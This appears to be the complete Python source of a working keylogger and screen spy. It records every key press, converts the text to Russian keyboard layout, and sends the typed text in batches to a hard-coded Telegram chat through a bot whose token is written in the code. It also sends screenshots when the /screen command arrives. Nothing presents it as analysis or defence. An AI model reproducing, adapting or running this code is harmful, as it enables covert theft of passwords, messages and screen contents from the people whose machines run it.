import keyboard
import telebot
import threading
import pyautogui
  
strg = ""
strg_ru = ""
trans_dict = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г',
    'i': 'ш', 'o': 'щ', 'p': 'з', '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы',
    'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
    ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и',
    'n': 'т', 'm': 'ь', ',': 'б', '.': 'ю', '/': '.'
}


token='6903738949:AAHzRiB3rJTdMoStV3O8uQd5PjmopRVvBW8'
bot=telebot.TeleBot(token)
bot.send_message("246259983","STARTING AP")


@bot.message_handler(commands=['screen'])
def start_message(message):
    screenshot = pyautogui.screenshot()
    bot.send_photo(message.chat.id, photo = screenshot)

thread = threading.Thread(target=bot.infinity_polling,daemon=True)
thread.start()

def on_key_event(event):
    global strg,strg_ru
    
    if event.name == 'space': 
        strg += ' '
        strg_ru += ' '
    
    if len(event.name) == 1:
        ch = event.name
        strg+=ch
        strg_ru += trans_dict.get(ch.lower(), ch).upper() if ch.isupper() else trans_dict.get(ch.lower(), ch)
    
    if len(strg)>=10 or event.name == 'enter':
        if event.name == 'enter': strg+='\n'
        if len(strg.strip())>0:
            bot.send_message("246259983",f'{strg}\n{strg_ru}')
        strg = ""
        strg_ru = ""

keyboard.on_press(on_key_event)
keyboard.wait()

